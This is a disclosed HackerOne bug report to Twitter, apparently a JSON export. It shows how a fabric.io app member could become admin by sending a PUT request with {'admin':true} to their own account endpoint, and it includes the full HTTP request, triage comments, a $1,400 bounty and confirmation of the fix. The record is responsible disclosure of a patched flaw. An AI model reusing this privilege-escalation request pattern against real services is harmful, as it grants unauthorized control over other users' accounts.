{"id":42961,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80Mjk2MQ==","url":"https://hackerone.com/reports/42961","title":"fabric.io - app member can make himself an admin","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-01-08T14:46:02.986Z","submitted_at":"2015-01-08T14:46:02.986Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"satishb3","url":"/satishb3","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-03-09T02:30:42.041Z","bug_reporter_agreed_on_going_public_at":"2015-02-07T02:30:21.073Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Let say, Alice is a member of TestApp.\r\n\r\n-\u003e Log into fabric.io as Alice and navigate to settings.\r\n-\u003e Click on Apps and choose TestApp.\r\n-\u003e Click on team members link and notice that Alice role is Member. \r\n\r\nClicking on team members link sends a similar request as shown below. \r\n\r\nGET /api/v2/organizations/[orgid]/apps/[appid]/team_members HTTP/1.1\r\nHost: fabric.io\r\n...\r\n\r\nResponse to the above request displays the Alice id as shown below.\r\n..{\"name\":\"alice\",\"email\":\"alice@mailinator.com\",\"id\":\"54aa4ab19ea6961359001260\",\"is_activated\":true,\"is_admin\":false}]\r\n\r\n-\u003e Use the alice id and send the below shown PUT request.\r\n\r\nPUT /accounts/54aa4ab19ea6961359001260 HTTP/1.1\r\nHost: fabric.io\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json; charset=UTF-8\r\nX-CSRF-Token: ...\r\nX-CRASHLYTICS-DEVELOPER-TOKEN: ...\r\nX-Requested-With: XMLHttpRequest\r\nReferer: https://fabric.io/settings/apps/54ad5e03a25bb8136b000002/team_members\r\nCookie: _fabric_session=...\r\nConnection: keep-alive\r\nContent-Length: 17\r\n\r\n{\"admin\":true}\r\n\r\n Note: In the above request Content-Type: application/json; charset=UTF-8 is mandatory. \r\n\r\n-\u003e It changes the Alice role to Admin.\r\n-\u003e Refresh the browser and navigate to TestApp team members. You will notice Alice role is Admin. Now, Alice can change/delete all other users in the team.","vulnerability_information_html":"\u003cp\u003eLet say, Alice is a member of TestApp.\u003c/p\u003e\n\n\u003cp\u003e-\u0026gt; Log into fabric.io as Alice and navigate to settings.\u003cbr\u003e\n-\u0026gt; Click on Apps and choose TestApp.\u003cbr\u003e\n-\u0026gt; Click on team members link and notice that Alice role is Member. \u003c/p\u003e\n\n\u003cp\u003eClicking on team members link sends a similar request as shown below. \u003c/p\u003e\n\n\u003cp\u003eGET /api/v2/organizations/[orgid]/apps/[appid]/team_members HTTP/1.1\u003cbr\u003e\nHost: fabric.io\u003cbr\u003e\n...\u003c/p\u003e\n\n\u003cp\u003eResponse to the above request displays the Alice id as shown below.\u003cbr\u003e\n..{\u0026quot;name\u0026quot;:\u0026quot;alice\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u003ca title=\"alice@mailinator.com\" href=\"mailto:alice@mailinator.com\" rel=\"nofollow noopener noreferrer\"\u003ealice@mailinator.com\u003c/a\u003e\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;54aa4ab19ea6961359001260\u0026quot;,\u0026quot;is_activated\u0026quot;:true,\u0026quot;is_admin\u0026quot;:false}]\u003c/p\u003e\n\n\u003cp\u003e-\u0026gt; Use the alice id and send the below shown PUT request.\u003c/p\u003e\n\n\u003cp\u003ePUT /accounts/54aa4ab19ea6961359001260 HTTP/1.1\u003cbr\u003e\nHost: fabric.io\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nContent-Type: application/json; charset=UTF-8\u003cbr\u003e\nX-CSRF-Token: ...\u003cbr\u003e\nX-CRASHLYTICS-DEVELOPER-TOKEN: ...\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nReferer: \u003ca title=\"https://fabric.io/settings/apps/54ad5e03a25bb8136b000002/team_members\" href=\"/redirect?url=https%3A%2F%2Ffabric.io%2Fsettings%2Fapps%2F54ad5e03a25bb8136b000002%2Fteam_members\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://fabric.io/settings/apps/54ad5e03a25bb8136b000002/team_members\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: _fabric_session=...\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Length: 17\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;admin\u0026quot;:true}\u003c/p\u003e\n\n\u003cp\u003eNote: In the above request Content-Type: application/json; charset=UTF-8 is mandatory. \u003c/p\u003e\n\n\u003cp\u003e-\u0026gt; It changes the Alice role to Admin.\u003cbr\u003e\n-\u0026gt; Refresh the browser and navigate to TestApp team members. You will notice Alice role is Admin. Now, Alice can change/delete all other users in the team.\u003c/p\u003e\n","bounty_amount":"1400.0","formatted_bounty":"$1,400","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-03-09T02:30:21.529Z","allow_singular_disclosure_after":-183353203.22213623,"singular_disclosure_allowed":true,"vote_count":2,"voters":["eveeez","fantam1"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":306869,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi, thank you for the report.\n\nHowever, we cannot reproduce this issue. Can you please verify the account sending the PUT request is not an adminstrator for the organization and has no special privileges? Also, please verify the request and make sure you have sent all relevant headers and the correct path. Thanks!","markdown_message":"\u003cp\u003eHi, thank you for the report.\u003c/p\u003e\n\n\u003cp\u003eHowever, we cannot reproduce this issue. Can you please verify the account sending the PUT request is not an adminstrator for the organization and has no special privileges? Also, please verify the request and make sure you have sent all relevant headers and the correct path. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T04:27:24.809Z","updated_at":"2015-01-09T04:27:24.809Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":306879,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, Made a video but it is 15 MB (Hackerone limits 10MB). Do you recommend any other place to upload ?","markdown_message":"\u003cp\u003eHi, Made a video but it is 15 MB (Hackerone limits 10MB). Do you recommend any other place to upload ?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T05:14:19.300Z","updated_at":"2015-01-09T05:14:19.300Z","actor":{"username":"satishb3","cleared":true,"url":"/satishb3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":306887,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Please upload to youtube and mark it unlisted. Thanks.","markdown_message":"\u003cp\u003ePlease upload to youtube and mark it unlisted. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T05:35:39.332Z","updated_at":"2015-01-09T05:35:39.332Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":306903,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Uploaded to https://www.youtube.com/watch?v=W6Gj_DQMq0M \nClarity is little poor. Let me know if it not clear.","markdown_message":"\u003cp\u003eUploaded to \u003ca title=\"https://www.youtube.com/watch?v=W6Gj_DQMq0M\" href=\"/redirect?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DW6Gj_DQMq0M\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.youtube.com/watch?v=W6Gj_DQMq0M\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nClarity is little poor. Let me know if it not clear.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T06:07:59.835Z","updated_at":"2015-01-09T06:07:59.835Z","actor":{"username":"satishb3","cleared":true,"url":"/satishb3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":307291,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T20:23:27.823Z","updated_at":"2015-01-09T20:23:27.823Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":314585,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","markdown_message":"\u003cp\u003eThanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-21T02:32:16.069Z","updated_at":"2015-01-21T02:32:16.069Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"satishb3","url":"/satishb3"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":318173,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-26T19:02:36.485Z","updated_at":"2015-01-26T19:02:36.485Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"satishb3","url":"/satishb3"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":318669,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is fixed. Thanks for the bounty.","markdown_message":"\u003cp\u003eIt is fixed. Thanks for the bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-27T06:24:41.192Z","updated_at":"2015-01-27T06:24:41.192Z","actor":{"username":"satishb3","cleared":true,"url":"/satishb3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":327339,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-07T02:30:21.142Z","updated_at":"2015-02-07T02:30:21.142Z","first_to_agree":true,"actor":{"username":"satishb3","cleared":true,"url":"/satishb3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":348772,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-03-09T02:30:44.534Z","updated_at":"2015-03-09T02:30:44.534Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}